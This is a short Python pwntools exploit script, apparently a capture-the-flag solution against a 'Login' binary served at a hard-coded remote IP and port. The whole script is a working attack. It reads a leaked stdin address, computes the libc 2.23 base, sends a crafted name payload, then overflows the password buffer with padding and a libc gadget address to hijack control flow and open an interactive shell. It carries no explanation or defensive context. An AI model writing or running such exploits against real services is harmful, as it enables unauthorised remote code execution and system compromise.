from pwn import *
# p=process('./Login')
p=remote('59.110.164.72',10020)
libc=ELF('./libc-2.23.so')
context.log_level='debug'
# gdb.attach(p,'b *0x0000000000400778')
pause()
p.recvuntil(b'Here is a tip: 0x')
stdin_addr=int(p.recv(12),16)
print('stdin_addr',hex(stdin_addr))
base=stdin_addr-libc.symbols['_IO_2_1_stdin_']
print('base',hex(base))
p.recvuntil(b'name:\n')
payload=b'a'*28+p8(0xcc)+p8(0x15)+p8(0xcc)+p8(0x15)

p.send(payload)
p.recvuntil(b'input the password:\n')
payload=b'a'*0x20+p64(0xdeadbeef)+p64(base+0xf03a4)+p64(0)*8
p.sendline(payload)
p.interactive()